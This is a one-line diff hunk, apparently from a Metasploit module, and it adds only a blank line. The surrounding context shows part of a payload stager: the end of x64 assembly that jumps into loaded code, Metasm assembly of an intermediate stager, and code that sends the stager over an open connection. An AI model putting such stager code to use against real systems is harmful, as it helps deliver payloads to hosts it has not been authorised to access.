@@ -81,6 +81,7 @@ module MetasploitModule
       add rsi, rax
       jmp rsi
     )
+
     midstager = Metasm::Shellcode.assemble(Metasm::X64.new, midstager_asm).encode_string
     vprint_status("Transmitting intermediate stager...(#{midstager.length} bytes)")
     conn.put(midstager) == midstager.length
